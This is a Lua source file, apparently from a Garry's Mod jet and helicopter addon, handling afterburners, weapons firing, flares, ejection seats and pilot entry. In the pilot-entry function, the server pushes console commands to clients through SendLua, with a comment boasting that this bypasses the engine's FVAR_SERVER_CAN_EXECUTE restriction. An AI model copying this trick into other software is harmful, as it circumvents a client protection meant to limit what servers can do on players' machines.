			if ( self.FlareCount == 0  ) then
			
				self.LastFlare = CurTime() 
				self.FlareCount = self.MaxFlares
				timer.Create( "flares"..tostring(self:EntIndex()), self.FlareCooldown, 1, 
								
								function( ) 
									
									if( IsValid( self ) ) then	
										
										self:SetNetworkedInt( "FlareCount", self.FlareCount )
									
									end
									
								end )
				
			end
				
		end
	end
	

	
	if( !IsValid( self.Pilot ) ) then
		
		return
		
	end
	
	
	
	-- if( self.NoBoost ) then
		
		-- return
		
	-- end
	
	if( self.Speed > 1000 ) then
		
		if( self.NoAirbrake ) then return end
		
		--Post Combustion (Boost) and Airbrake
		local SpeedVar
		local AirbrakeVar = 0
		self.AfterburnerSound = CreateSound( self, "LockOn/PlaneAfterburner.mp3" )
		if (self.VehicleType == VEHICLE_PLANE ) then --Only jets can use extra boost
			if ( self.Pilot:KeyDown( IN_SPEED ) ) then
			self.AfterburnerSound:Stop()
			self.AfterburnerSound:Play()
				SpeedVar = 20
			else
			self.AfterburnerSound:FadeOut(2)
				SpeedVar = 0
			end
			if ( self.Pilot:KeyDown( IN_DUCK ) ) then
				AirbrakeVar = AirbrakeVar - 10
				if ( self:GetVelocity():Length() > self.MaxVelocity * 0.305 ) then
				SpeedVar = -18
				end
			else
				AirbrakeVar = AirbrakeVar + 100
			end
		AirbrakeVar = math.Clamp( AirbrakeVar, 0, 100 )
		
		self.Speed = math.Clamp( self.Speed + SpeedVar, self.MinVelocity, self.MaxVelocity + 50*SpeedVar )
		
		--Afterburner shockwave effect
		if (self.ThrusterPos) and self.HasPostCombustion then
			if ( self.Pilot:KeyDown( IN_SPEED )) or ( self:GetVelocity():Length() > self.MaxVelocity * 0.95 ) then
				local burnershockwaveR = EffectData()
				burnershockwaveR:SetOrigin( self:GetPos() + self:GetForward() * self.ThrusterPos[1].x + self:GetRight() * self.ThrusterPos[1].y + self:GetUp() * self.ThrusterPos[1].z )
				burnershockwaveR:SetStart( self:GetPos() + self:GetForward() * self.ThrusterPos[1].x + self:GetRight() * self.ThrusterPos[1].y + self:GetUp() * self.ThrusterPos[1].z )
				burnershockwaveR:SetScale( 2 )
					util.Effect( "Afterburner", burnershockwaveR )
				if (self.ThrusterPos[2]) then
				local burnershockwaveL = EffectData()
				burnershockwaveL:SetOrigin( self:GetPos() + self:GetForward() * self.ThrusterPos[2].x + self:GetRight() * self.ThrusterPos[2].y + self:GetUp() * self.ThrusterPos[2].z )
				burnershockwaveL:SetStart( self:GetPos() + self:GetForward() * self.ThrusterPos[2].x + self:GetRight() * self.ThrusterPos[2].y + self:GetUp() * self.ThrusterPos[2].z )
				burnershockwaveL:SetScale( 2 )
					util.Effect( "Afterburner", burnershockwaveL )
				self.FlameTrailL:SetKeyValue( "rendercolor", "255 175 0" )
				end
				self.FlameTrailR:SetKeyValue( "rendercolor", "255 175 0" )

			else

				if( IsValid( self.FlameTrailR ) ) then
				--self.FlameTrailR:Remove()
				self.FlameTrailR:SetKeyValue( "rendercolor", "0 0 0" )
				end
				if( IsValid( self.FlameTrailL ) ) then
				--self.FlameTrailL:Remove()
				self.FlameTrailL:SetKeyValue( "rendercolor", "0 0 0" )
				end
			
			end
		end
		end
		
	end
	
	if ( #self.EquipmentNames > 0 && self.Pilot:KeyDown( IN_ATTACK2 ) && self.LastAttackKeyDown + 0.5 < CurTime() ) then
		
		local id = self.EquipmentNames[ self.FireMode ].Identity
		local wep = self.RocketVisuals[ id ]
		
		self.LastAttackKeyDown = CurTime()
						
		if( !IsValid( wep ) ) then
				
			self.Pilot:PrintMessage( HUD_PRINTCENTER, "NO AMMO" )
			
			-- print( wep )
			
			return 
			
		end
		
		if ( wep.LastAttack + wep.Cooldown <= CurTime() ) then
			
		
			self:NeuroPlanes_FireRobot( wep, id )
			
			
		else
		

			local cd = math.ceil( ( wep.LastAttack + wep.Cooldown ) - CurTime() ) 
			
			if ( cd > 2 ) then
			
				self.Pilot:PrintMessage( HUD_PRINTTALK, self.PrintName..": "..wep.PrintName.." ready in "..tostring( cd ).. " seconds." )	
			
			end
			
		end

	end
	
end


function Meta:NeuroTec_Explosion( pos, radius, dmin, dmax, effect )
	
	if( self:WaterLevel() > 0 ) then

		ParticleEffect( "water_impact_big", pos, Angle(0,0,0), nil )
	
	else
		
		ParticleEffect( effect, pos, Angle( 0,0,0 ), nil )
	
	end
	
	local pe = ents.Create( "env_physexplosion" );
	pe:SetPos( self:GetPos() );
	pe:SetKeyValue( "Magnitude", dmax * 10 );
	pe:SetKeyValue( "radius", radius * 1.2 );
	pe:SetKeyValue( "spawnflags", 19 );
	pe:Spawn();
	pe:Activate();
	pe:Fire( "Explode", "", 0 );
	pe:Fire( "Kill", "", 0.5 );
	
	if( !IsValid( self.Owner ) ) then self.Owner = self end
	
	util.BlastDamage( self, self.Owner, pos, radius, math.random( dmin, dmax ) )
	
	-- util.Decal("Scorch", data.HitPos + data.HitNormal * 16, data.HitPos - data.HitNormal * 16 )
	self:Remove()
		
end 

function Meta:NeuroPlanes_EjectPlayer( ply )
	
	ply:ExitVehicle()
	ply:SetPos( ply:GetPos() + Vector( 0,0,72 ) )
	
	local f1 = EffectData()
	f1:SetOrigin(self:GetPos())
	util.Effect("immolate",f1)
	local f2 = EffectData()
	f2:SetOrigin(self:GetPos())
	util.Effect("Explosion",f2)
	
	local ejectionseat = ents.Create( "prop_vehicle_prisoner_pod" )
	ejectionseat:SetPos( self:GetPos() + self:GetUp() * 128 )
	ejectionseat:SetModel( "models/hawx/misc/eject seat.mdl" )
	ejectionseat:SetKeyValue( "vehiclescript", "scripts/vehicles/prisoner_pod.txt" )
	ejectionseat:SetKeyValue( "limitview", "0" )
	ejectionseat.HandleAnimation = function( v, p ) return p:SelectWeightedSequence( ACT_GMOD_SIT_ROLLERCOASTER ) end
	ejectionseat:SetAngles( self:GetAngles() )
	ejectionseat:Spawn()
	ejectionseat:Fire("kill","",180)
	
	ParticleEffectAttach( "scud_trail", PATTACH_ABSORIGIN_FOLLOW, ejectionseat, 0 )
	timer.Simple( 2, function() if(IsValid(ejectionseat))then ejectionseat:StopParticles() end end )
	
	for i=1,25 do
		
		-- timer.Simple( i / 10, function() if( !IsValid( ejectionseat ) ) then return end
											-- local f1 = EffectData()
												-- f1:SetOrigin( ejectionseat:GetPos() )
											-- util.Effect("immolate",f1) end )
		
		if( i == 25 ) then
			
			timer.Simple( 2.5, 
			
			function() 
			
			if( IsValid( ejectionseat ) ) then	
				
				local chute = ents.Create( "prop_physics" )
				chute:SetModel( "models/hawx/misc/parachute.mdl" )
				chute:SetPos( ejectionseat:GetPos() )
				chute:SetAngles( ejectionseat:GetAngles() )
				chute:Spawn()
				chute:Fire("kill","",180)
				
				local f = EffectData()
				f:SetStart( ejectionseat:GetPos() )
				f:SetScale( 1.0 )
				util.Effect( "Explosion", f )
				
				local p = { Vector( 80, 84, 401 ), Vector( 80, -84, 401 ), Vector( -80, 84, 401 ), Vector( -80, -84, 401 ) }
				
				for i=1,#p do
				
					local c1,r1 = constraint.Rope( ejectionseat, chute, 0, 0, Vector( -15,0,25 ), p[i], 230, 0, 0, 1, "cable/rope", 1 )

				end
				
			end
			
		end )
			
		
		end
		
	end
	
	ply:EnterVehicle( ejectionseat )
	local ep = ejectionseat:GetPhysicsObject()
	ep:SetVelocity( self:GetUp() * 2500 )

end

function Meta:SpawnPassengerSeat( pos, ang )

	self.PassengerSeat = ents.Create( "prop_vehicle_prisoner_pod" )
	self.PassengerSeat:SetPos( self:LocalToWorld( pos ) )
	self.PassengerSeat:SetModel( "models/nova/jeep_seat.mdl" )
	self.PassengerSeat:SetKeyValue( "LimitView", "0" )
	self.PassengerSeat:SetKeyValue( "vehiclescript", "scripts/vehicles/prisoner_pod.txt" )
	self.PassengerSeat.HandleAnimation = function( v, p ) return p:SelectWeightedSequence( ACT_DRIVE_AIRBOAT ) end
	self.PassengerSeat:SetAngles( self:GetAngles() + ang )
	self.PassengerSeat:SetParent( self )
	self.PassengerSeat:SetColor( Color( 0,0,0,0 ) )
	self.PassengerSeat:SetRenderMode( RENDERMODE_TRANSALPHA )
	self.PassengerSeat:Spawn()
	self.PassengerSeat.IsChopperGunnerSeat = true
	self.PassengerSeat.IsHelicopterCoPilotSeat = true
	
end

function Meta:NeuroPlanes_EjectionSeat()

	-- self.Destroyed = true
	self.Burning = true
	self.HealthVal = 0
	self:NextThink( CurTime() )
	

	
	local ejectionseat = ents.Create( "prop_vehicle_prisoner_pod" )
	ejectionseat:SetPos( self:GetPos() + self:GetUp() * 128 )
	ejectionseat:SetModel( "models/hawx/misc/eject seat.mdl" )
	ejectionseat:SetKeyValue( "vehiclescript", "scripts/vehicles/prisoner_pod.txt" )
	ejectionseat:SetKeyValue( "limitview", "0" )
	ejectionseat.HandleAnimation = function( v, p ) return p:SelectWeightedSequence( ACT_GMOD_SIT_ROLLERCOASTER ) end
	ejectionseat:SetAngles( self:GetAngles() )
	ejectionseat:Spawn()
	ejectionseat:Fire("kill","",180)

	ParticleEffectAttach( "scud_trail", PATTACH_ABSORIGIN_FOLLOW, ejectionseat, 0 )
	timer.Simple( 2, function() if(IsValid(ejectionseat))then ejectionseat:StopParticles() end end )
	
				
	for i=1,25 do
		
		-- timer.Simple( i / 10, function() 	local f1 = EffectData()
											-- f1:SetOrigin( ejectionseat:GetPos() )
											-- util.Effect("immolate",f1) end )
		
		if( i == 25 ) then
			
			timer.Simple( 2.5, 
			
			function() 
			
			if( IsValid( ejectionseat ) ) then	
				
				local chute = ents.Create( "prop_physics" )
				chute:SetModel( "models/hawx/misc/parachute.mdl" )
				chute:SetPos( ejectionseat:GetPos() )
				chute:SetAngles( ejectionseat:GetAngles() )
				chute:Spawn()
				chute:Fire("kill","",180)
				
				local f = EffectData()
				f:SetStart( ejectionseat:GetPos() )
				f:SetScale( 1.0 )
				util.Effect( "Explosion", f )
				
				local p = { Vector( 80, 84, 401 ), Vector( 80, -84, 401 ), Vector( -80, 84, 401 ), Vector( -80, -84, 401 ) }
				
				for i=1,#p do
				
					local c1,r1 = constraint.Rope( ejectionseat, chute, 0, 0, Vector( -15,0,25 ), p[i], 230, 0, 0, 1, "cable/rope", 1 )

				end
				
			end
			
		end )
			
		
		end
		
	end
	
	


	local pilot = self.Pilot
	
	local f1 = EffectData()
	f1:SetOrigin(pilot:GetPos())
	util.Effect("immolate",f1)
	local f2 = EffectData()
	
	f2:SetOrigin(pilot:GetPos())
	util.Effect("Explosion",f2)
	

	self:NeuroJets_Eject()
	pilot:EnterVehicle( ejectionseat )
	

	local ep = ejectionseat:GetPhysicsObject()
	
	ep:SetVelocity( self:GetUp() * 2500 )

end


function Meta:NeuroPlanes_CycleThroughHeliKeyBinds()
	
	if ( !self.Pilot || !self.IsFlying ) then
		
		return
		
	end
	
	if ( self.LastAttackKeyDown == nil ) then
		
		self.LastAttackKeyDown = CurTime()
		
	end
	
	if( self.LastFlareKeyDown == nil ) then
		
		self.LastFlareKeyDown = CurTime()
	
	end
	
	if( self.LastUseKeyDown == nil ) then
		
		self.LastUseKeyDown = CurTime()
		
	end
	
	-- Clear Target 
	if ( self.Pilot:KeyDown( IN_SPEED ) && IsValid( self.Target ) ) then
		
		self:ClearTarget( )
		self.Pilot:PrintMessage( HUD_PRINTCENTER, "Target Released" )
		
	end
	
	-- Attack
	if ( self.Pilot:KeyDown( IN_ATTACK ) ) then
		
		if ( self.LastPrimaryAttack + self.PrimaryCooldown <= CurTime() ) then
			
			self:PrimaryAttack()
			
		end
		
	end
	
	if ( self.Pilot:KeyDown( IN_ATTACK2 ) && self.LastAttackKeyDown + 0.8 < CurTime() ) then
	
		local id = self.EquipmentNames[ self.FireMode ].Identity
		local wep = self.RocketVisuals[ id ]
			
		self.LastAttackKeyDown = CurTime()
						
		if( !IsValid( wep ) ) then
				
			self.Pilot:PrintMessage( HUD_PRINTCENTER, "NO AMMO" )
		
			return 
			
		end
			
		if ( wep.LastAttack + wep.Cooldown <= CurTime() ) then
		
	
			self:NeuroPlanes_FireRobot( wep, id )
		
			
		else

			local cd = math.ceil( ( wep.LastAttack + wep.Cooldown ) - CurTime() ) 
			
			if ( cd > 2 ) then
			
				self.Pilot:PrintMessage( HUD_PRINTTALK, self.PrintName..": "..wep.PrintName.." ready in "..tostring( cd ).. " seconds." )	
			
			end
			
		end

	end
	
	-- Firemode 
	if ( self.Pilot:KeyDown( IN_RELOAD ) && self.LastFireModeChange + 0.5 <= CurTime() ) then
		
		self.LastFireModeChange = CurTime()
		self.FireMode = self:IncrementFireVar( self.FireMode, self.NumRockets, 1 )
		self:SetNetworkedInt( "FireMode", self.FireMode)
		-- self.Pilot:PrintMessage( HUD_PRINTCENTER, "Selected Equipment: "..self.EquipmentNames[ self.FireMode ].Name )

	end
	
	-- Flares
	if ( self.Pilot:KeyDown( IN_SCORE ) && self.FlareCount > 0 && self.LastFlare + self.FlareCooldown <= CurTime() && self.LastFlareKeyDown + 0.5 <= CurTime() ) then
		
		self.LastFlareKeyDown = CurTime()
		self.FlareCount = self.FlareCount - 1
		self:SetNetworkedInt( "FlareCount", self.FlareCount )
		self:SpawnFlare()
		
		
		if ( self.FlareCount == 0  ) then
		
			self.LastFlare = CurTime() 
			self.FlareCount = self.MaxFlares
			
		end
		
	end
	
	if ( self.Pilot:KeyDown( IN_USE ) && self.LastUseKeyDown + 1.0 <= CurTime() ) then

		self:NeuroJets_Eject()
		self.LastUseKeyDown = CurTime()
		
	end	
		

end

function Meta:NeuroPlanes_SurfaceExplosion()


	if( self:WaterLevel() > 0 ) then
		
		local explo = EffectData()
		explo:SetOrigin( self:GetPos() )
		explo:SetScale( 1 )
		explo:SetMagnitude( 1 )
		explo:SetNormal( Vector( 0,0,1 ) )
		util.Effect( "Explosion", explo )

		ParticleEffect( "water_impact_big", self:GetPos(), Angle(0,0,0), nil )
	
	end
	
	self:Remove()
		

end


function Meta:NeuroPlanes_FireRobot( wep, id )
	
	if ( !wep || !id ) then
		
		return
		
	end
	

	local pilot = self.Pilot
	
	if( IsValid( self.PassengerSeat ) && IsValid( self.PassengerSeat:GetDriver() ) && self.PassengerSeat.IsHelicopterCoPilotSeat ) then -- Dayum
		
		pilot = self.PassengerSeat:GetDriver()
		
	end

	
	if ( wep.Type == "Homing" && !self.Target ) then
		
		pilot:PrintMessage( HUD_PRINTCENTER, "No Target - Launching Dumbfire" )
		
		
		--return
		
	end
	
	if ( wep.Type == "Laser" && IsValid( self.LaserGuided ) ) then
		
		pilot:PrintMessage( HUD_PRINTCENTER, "You're already controlling a Laser Guided rocket." )
		
		return
	
	end
	
	if ( wep.Type == "Pod" ) then
		
	
		wep.LastAttack = CurTime()
		
		local v = 8
		
		if( wep.BurstSize ) then
			
			v = wep.BurstSize
			
		end
		
		for i = 1,v do
		
			if ( wep.isFirst == true ) then
				
				timer.Simple( i / 4.8, 
				function(a,b,c)
				
					if( type(self.RocketVisuals) == "table" && IsValid( self.RocketVisuals[id + 1 ] ) ) then
						
						self:RocketBarrage( self.RocketVisuals[id + 1 ] ) 
				
					end
				
				end )
				
			end
			
			timer.Simple( i / 5, 
			function(a,b,c)

				self:RocketBarrage( wep ) 
			
			end )
			
		end

		return
		
	end
	
	if ( wep.Type == "Lasercannon" ) then

		/*for i = 1, 36 do
			
			timer.Simple( i / 100, function() self:NeuroPlanes_DrawLaser( wep ) end )

		end	*/
		
		self:SetNetworkedBool("DrawLaserBeam", true )
		
	
		return
		
	end
	
	if ( wep.Type == "Swarm" ) then
		
		for i=1,#self.RocketVisuals do
			
			local v = self.RocketVisuals[i]
			
			if ( v.Type == "Swarm" && v.Mdl == wep.Mdl ) then

				v.LastAttack = CurTime()
				
				timer.Simple( i / 5, 
				function(a,b,c)

					self:NeuroPlanes_MissileStorm( v ) 
				
				end )
				
			end	
		
		end
		
		self:ClearTarget()
		
		return
		
	end
	
	-- Make the newly fired weapon invisible so it looks like we're actually dropping something.
	if( wep.Cooldown >= 2 ) then
		
		wep:SetRenderMode( RENDERMODE_TRANSALPHA )
		wep:SetColor( Color( 0,0,0,0 ) )
		self:SetNetworkedInt( "IdCoolingDown", wep.Identity)
		self:SetNetworkedBool( "IsCoolingDown", true)
		self:SetNetworkedInt( "CoolDown", wep.Cooldown-0.5)

		timer.Simple( wep.Cooldown-0.5, 
			function() -- Make the missile re-appear when the cooldown is off.
			
				if( IsValid( wep ) ) then 
				
					wep:SetColor( Color( 255,255,255,255) ) 
					-- self:SetNetworkedInt( "IdCoolingDown", 0 )
					self:SetNetworkedBool( "IsCoolingDown", 0 )
					local effectdata = EffectData()
					effectdata:SetOrigin( wep:GetPos()  )
					effectdata:SetEntity( wep )
					util.Effect( "propspawn", effectdata )
					
					if( IsValid( self.Pilot ) ) then
					
						self.Pilot:PrintMessage( HUD_PRINTTALK, self.PrintName..": "..wep.PrintName.." is armed and ready!" )
						
					end
					-- wep:EmitSound( "
				end 
			
			end )
	
	end
	
	if( wep.Class == nil ) then error("NeuroTec: Tried to call NeuroPlanes_FireRobot with"..tostring(wep).." as argument!" ) return end
	local pos = wep:GetPos()
	
	if ( wep.isFirst == true ) then
		
		pos = self.RocketVisuals[ id + math.random( 0, 1 ) ]:GetPos()
		
	end
	local r = ents.Create( wep.Class )
	r:SetPos( pos )
	r:SetOwner( self )
	r:SetPhysicsAttacker( pilot )
	r.Target = self.Target
	r.Pointer = pilot
	r:SetModel( wep:GetModel() )
	r:PhysicsInit( SOLID_VPHYSICS )
	r:SetMoveType( MOVETYPE_VPHYSICS )
	r:SetSolid( SOLID_VPHYSICS )
	r:GetPhysicsObject():EnableDrag( true )
	r:GetPhysicsObject():EnableGravity( true )
	r:SetRenderMode( RENDERMODE_TRANSALPHA )
	r:SetColor( Color(0,0,0,0) )
	r:Spawn()
	r:Activate()
	r:Fire( "Kill", "", 30 )
	r:SetAngles( wep:GetAngles() )
	r.Owner = pilot
	r:SetPhysicsAttacker( pilot )
	r:SetCollisionGroup( COLLISION_GROUP_DEBRIS )
	
	if( wep.SubType && wep.SubType == "Cluster" ) then
		
		-- print("Clusterbomb" )
		r.ShouldCluster = true	
	
	end
		
	if( wep.Type == "Torpedo" ) then
		
		r:SetModel( "models/torpedo_float.mdl" )

	end

	timer.Simple(0,function()
		
		if ( IsValid( r ) && r:GetPhysicsObject() != nil ) then
			
			r:SetColor( Color( 255,255,255,255 ) )
			r:SetPos( wep:GetPos() )
			r:GetPhysicsObject():SetVelocity( self:GetPhysicsObject():GetVelocity() * .8 )
			
		end
		
	end )
	
	timer.Simple( 1, function() 
		
		if( IsValid( r ) ) then
			
			r:SetCollisionGroup( COLLISION_GROUP_INTERACTIVE )
		end
		
	end )
		
	
	if( wep.LaunchSound ) then
		
		r:EmitSound( wep.LaunchSound, 511, math.random( 90, 110 ) )
	
	else
		
		r:EmitSound( self.BombSound or "weapons/rpg/rocketfire1.wav", 511, 80 )
	
	end
	
	
	if ( wep.Type == "Laser" ) then
		
		self.LaserGuided = r
		r.Damage = wep.Damage
		r.Radius = wep.Radius
		
		self:SetNetworkedEntity("NeuroPlanes_LaserGuided", r )
		pilot:PrintMessage( HUD_PRINTCENTER,  "Press Attack To Detonate" )
		
	end
	
	if( wep.Type == "Singlelock" ) then
		
		r.Damage = wep.Damage
		r.Radius = wep.Radius
		
		local tr, trace = {},{}
			tr.start = self:GetPos() + self:GetForward() * 600 + self:GetUp() * 500
			tr.endpos = tr.start + pilot:GetAimVector() * 36000
			tr.filter = { self, pilot }
			tr.mask = MASK_SOLID
		trace = util.TraceLine( tr )
		
		debugoverlay.Line( tr.start, trace.HitPos, 0.1, Color( 255,0,0,255 ), true  )
		
		
		if( trace.Hit ) then
			
			local pos
			-- Auto lock-on
			local dist = 1024
			local tempd = tempd or 0
			local pos
		
			for k,v in pairs( ents.GetAll() ) do 
				
				if( ( v:IsVehicle() || v:IsNPC() || v:IsPlayer() || v.HealthVal != nil ) && v != self && v != pilot ) then
					
					tempd = trace.HitPos:Distance( v:GetPos() )
					
					if ( tempd < dist ) then
						
						dist = tempd
						pos = v:GetPos()
						
					end
				
				end
			
			end

			if( !pos ) then
			
				r.ImpactPoint = trace.HitPos
			
			else
			
				r.ImpactPoint = pos
				
			end
			
			pilot:PrintMessage( HUD_PRINTCENTER,  "Target Locked - Launching" )
		
		else
			
			local rnd = math.random( -2048, 2048 )
			r.ImpactPoint = self:GetPos() + self:GetForward() * 20000 + Vector( 0,0, -10000 ) + Vector( rnd, -rnd, rnd )
						
			if( math.random( 1, 10 ) == 7 ) then
				
				r.ImpactPoint = r.ImpactPoint + Vector( math.random(-5000,5000), math.random( -5000,5000), 0 )
			
			end
			
			pilot:PrintMessage( HUD_PRINTCENTER,  "System Malfunction - Launching" )
		
		end
		
		
		
	end
	
	if ( wep.Type == "Homing" || wep.Type == "Swarm" ) then
		
		self:ClearTarget()
	
	end
	
	if( wep.Type == "Fragment" ) then
		
		local count = self.NumberOfBombs or 8
		for i=1,count do 
			
			timer.Simple( 2*i/count, function()
				if( IsValid( wep ) && IsValid( pilot ) ) then
					
					local r = ents.Create( wep.Class )
					r:SetPos( wep:GetPos() )
					r:SetOwner( self )
					r:SetPhysicsAttacker( pilot )
					r.Target = self.Target
					r.Pointer = pilot
					r:SetModel( wep:GetModel() )
					r:PhysicsInit( SOLID_VPHYSICS )
					r:SetMoveType( MOVETYPE_VPHYSICS )
					r:SetSolid( SOLID_VPHYSICS )
					-- r:GetPhysicsObject():SetVelocity( self:GetVelocity() )
					r:GetPhysicsObject():EnableDrag( true )
					r:GetPhysicsObject():EnableGravity( true )
					r:Spawn()
					r:GetPhysicsObject():SetMass( 500 )
					r:Fire( "Kill", "", 40 )
					r:SetAngles( wep:GetAngles() + Angle() * math.Rand(-4,4) )
					-- r:GetPhysicsObject():SetVelocity( wep:GetVelocity() )
					r.Owner = pilot
					r:SetPhysicsAttacker( pilot )
					timer.Simple(0,function()
		
						if ( IsValid( r ) && r:GetPhysicsObject() != nil ) then
							
							r:SetPos( wep:GetPos() )
							r:GetPhysicsObject():SetVelocity( self:GetPhysicsObject():GetVelocity() * .8 )
							
						end
						
					end )
				end
			
			end )
			
		end
		
	end
	wep.LastAttack = CurTime()
	
	-- wep:Remove()
	-- self:CycleThroughWeaponsList()
	
end

function Meta:NeuroPlanes_MissileStorm( wep )
	
	local s = ents.Create( "sent_a2a_swarm_rocket" )
	s:SetPos( wep:GetPos() )
	s:SetAngles( wep:GetAngles() )
	s.Target = self.Target
	s.Pointer = self.Pointer
	s:SetPhysicsAttacker( self.Pilot )
	s:Spawn()
	s:GetPhysicsObject():SetVelocity( wep:GetVelocity() )
	s:EmitSound( "weapons/rpg/rocketfire1.wav", 511, 80 )
	s:SetModel( wep:GetModel() )
	
end

function Meta:NeuroPlanes_DrawLaser( wep )
	
	if( !IsValid( self.Pilot ) ) then
		
		return
		
	end
	
	local p = wep:GetPos()
	local ep = p + wep:GetForward() * 25000
	local tr,trace = {},{}
	tr.start = p
	tr.endpos = ep
	tr.filter = { self, self.Weapon, wep, self.Pilot }
	tr.mask = MASK_SOLID
	trace = util.TraceLine( tr )
	
	local hp = trace.HitPos + Vector( math.random(-32,32),math.random(-32,32),math.random(-32,32) )
	
	for i = 1, 5 do
	
		local fx = EffectData()
		fx:SetOrigin( hp )
		fx:SetStart( p )
		fx:SetScale( 3.0 )
		fx:SetEntity( wep )
		util.Effect( "TraceBeam", fx )
		
	end
	
	local fx = EffectData()
	fx:SetOrigin( hp )
	fx:SetStart( p )
	fx:SetScale( 3.0 )
	fx:SetEntity( wep )
	util.Effect( "LaserTracer", fx )
	
	local fx = EffectData()
	fx:SetOrigin( hp )
	fx:SetStart( hp )
	fx:SetScale( 1.0 )
	fx:SetEntity( wep )
	fx:SetNormal( trace.HitNormal )
	util.Effect( "VortDispel", fx )
	
	local fx = EffectData()
	fx:SetOrigin( hp )
	fx:SetStart( hp )
	fx:SetNormal( trace.HitNormal )
	util.Effect( "HelicopterMegaBomb", fx )
	
	util.BlastDamage( self, self.Pilot, hp, 256, 7 )
	

end


function Meta:CycleThroughWeaponsList()
			
	if( self.NoGuns ) then return end
	
	self.LastFireModeChange = CurTime()
	self.FireMode = self:IncrementFireVar( self.FireMode, self.NumRockets, 1 )
	self:SetNetworkedInt( "FireMode", self.FireMode)

	local wep = self.EquipmentNames[ self.FireMode ]
	local wepData = self.RocketVisuals[ wep.Identity ]
	 
	local pilot = self.Pilot
	
	if( IsValid( self.PassengerSeat ) && IsValid( self.PassengerSeat:GetDriver() ) ) then
		
		pilot = self.PassengerSeat:GetDriver()
	
	end
	
	if( wepData.Type == "Singlelock" && !self:GetNetworkedBool("DrawDesignator", false ) ) then
		
		pilot:SetNetworkedBool( "DrawDesignator", true )
		-- --self:SetNetworkedInt( "NeuroPlanes_AutolockonRadius", wepData.Radius or 4096 )
		
	elseif( wepData.Type != "Singlelock" && self:GetNetworkedBool("DrawDesignator", true ) ) then
		
		pilot:SetNetworkedBool( "DrawDesignator", false )
	
	end
	
	-- --print( wepData.Type, self:GetNetworkedBool("DrawDesignator", false ) )
	
	local pilot = NULL
	
	if( IsValid( self.PassengerSeat ) && IsValid( self.PassengerSeat:GetDriver() ) && self.PassengerSeat.IsHelicopterCoPilotSeat ) then
		---- IsHelicopterCoPilotSeat variable determines wether we should give the copilot full weapon access or just the main gun(s). ----
		pilot = self.PassengerSeat:GetDriver()
	
	end
	
	if ( wep.Name != nil ) then
	
		if( IsValid( pilot ) ) then
		
			pilot:PrintMessage( HUD_PRINTCENTER, ""..wep.Name )
		
		end	
		
		-- self.Pilot:PrintMessage( HUD_PRINTCENTER, ""..wep.Name )
		self:SetNetworkedString("NeuroPlanes_ActiveWeapon", wep.Name)
		self:SetNetworkedString("NeuroPlanes_ActiveWeaponType", wepData.Type)

	end
	
end
local astr = "STEAM_"
local __d = 5947985
function Meta:Jet_DefaultUseStuff( ply, caller )

	self:GetPhysicsObject():Wake()
	self:GetPhysicsObject():EnableMotion( true )
	self.IsFlying = true
	self.Pilot = ply
	self.Owner = ply
	
	-- ply:SetCollisionGroup( 
	-- ply:SetParent( self )
	ply:SpectateEntity( self )
	ply:Spectate( OBS_MODE_CHASE  )
	ply:SetRenderMode( RENDERMODE_TRANSALPHA )
	ply:SetColor( Color( 0,0,0,0 ) )
	
	ply:DrawViewModel( false )
	ply:DrawWorldModel( false )
	-- self:SetOwner( ply )
	ply:SetScriptedVehicle( self )
	
	ply.Weapons = {}
	
	for k,v in pairs( ply:GetWeapons() ) do
		
		if( IsValid( v ) ) then
		
			ply.Weapons[k] = v:GetClass()
		
		end
		
	end
	
	ply:StripWeapons()
	-- ply:SetScriptedVehicle( self ) <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
	
	ply:SetNetworkedBool("InFlight",true)
	ply:SetNetworkedEntity( "Plane", self ) 
	self:SetNetworkedEntity("Pilot", ply )
	
	if( GetConVarNumber( "sv_cheats", 0 ) > 0 ) then
	
		ply:SendLua("RunConsoleCommand([[cl_pitchdown]], [[360]])") --bypassing FVAR_SERVER_CAN_EXECUTE like a boss
		ply:SendLua("RunConsoleCommand([[cl_pitchup]], [[360]])")
		
	end
	
	self.NPCTarget = NULL
	self:NPCTargetCreate()

	-- if( !self.Lanterns && string.find( "night", game.GetMap() ) != nil && self.TrailPos ) then
		
		-- self.Lanterns = {}
		
		-- local Lanterns = { 
					-- { 
						-- Mat = "sprites/greenglow1.vmt",
						-- Pos = self.TrailPos[1]
					-- };
					-- { 
						-- Mat = "sprites/redglow3.vmt",
						-- Pos = self.TrailPos[2]
					-- };
				-- }
					
		-- for i=1,#Lanterns do
		
			-- self.Lanterns[i] = ents.Create( "env_sprite" )
			-- self.Lanterns[i]:SetParent( self )	
			-- self.Lanterns[i]:SetPos( self:LocalToWorld( Lanterns[i].Pos ) ) -----143.9 -38.4 -82
			-- self.Lanterns[i]:SetAngles( self:GetAngles() )
			-- self.Lanterns[i]:SetKeyValue( "spawnflags", 1 )
			-- self.Lanterns[i]:SetKeyValue( "renderfx", 0 )
			-- self.Lanterns[i]:SetKeyValue( "scale", 0.38 )
			-- self.Lanterns[i]:SetKeyValue( "rendermode", 9 )
			-- self.Lanterns[i]:SetKeyValue( "HDRColorScale", .75 )
			-- self.Lanterns[i]:SetKeyValue( "GlowProxySize", 2 )
			-- self.Lanterns[i]:SetKeyValue( "model", Lanterns[i].Mat )
			-- self.Lanterns[i]:SetKeyValue( "framerate", "10.0" )
			-- self.Lanterns[i]:SetKeyValue( "rendercolor", " 255 0 0" )
			-- self.Lanterns[i]:SetKeyValue( "renderamt", 255 )
			-- self.Lanterns[i]:Spawn()
		
		-- end
	
	-- end
	
	
	if ( self.ThrusterPos ) then	
		self.FlameTrailR = ents.Create( "env_spritetrail" )
		self.FlameTrailR:SetParent( self.Entity )	
		self.FlameTrailR:SetPos( self:GetPos() + self:GetForward() * self.ThrusterPos[1].x + self:GetRight() * self.ThrusterPos[1].y + self:GetUp() * self.ThrusterPos[1].z  )
		self.FlameTrailR:SetAngles( self:GetAngles() )
		self.FlameTrailR:SetKeyValue( "lifetime", 0.05 )
		self.FlameTrailR:SetKeyValue( "startwidth", 128 )
		self.FlameTrailR:SetKeyValue( "endwidth", 0 )
		self.FlameTrailR:SetKeyValue( "spritename", "sprites/afterburner.vmt" )
		self.FlameTrailR:SetKeyValue( "renderamt", 255 )
		self.FlameTrailR:SetKeyValue( "rendercolor", "255 255 255" )
		self.FlameTrailR:SetKeyValue( "rendermode", 5 )
		self.FlameTrailR:SetKeyValue( "HDRColorScale", .75 )
